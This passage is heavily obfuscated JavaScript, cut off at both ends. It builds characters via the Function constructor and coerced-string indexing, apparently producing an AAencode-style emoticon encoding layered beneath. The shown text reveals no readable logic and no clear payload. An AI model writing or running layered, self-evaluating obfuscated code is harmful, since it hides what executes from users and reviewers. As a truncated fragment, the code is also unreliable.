String.fromCharCode(59)")()+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[15]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+(false+[0]+"")[7]+([false]+"")[16]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(969)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[14]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(949)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(46)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65417)")()+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(1076)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+(false+[0]+"")[7]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[12]+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(94)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(45)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+([false]+"")[11]+([false]+"")[11]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65392)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+(+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(43)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+[]["constructor"]["constructor"]("return String.fromCharCode(95)")()+[]["constructor"]["constructor"]("return String.fromCharCode(39)")()+([false]+"")[12]+(false+[0]+"")[7]+([false]+"")[13]+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+[]["constructor"]["constructor"]("return String.fromCharCode(952)")()+[]["constructor"]["constructor"]("return String.fromCharCode(65439)")()+([false]+"")[14]+[]["constructor"]["constructor"]("return 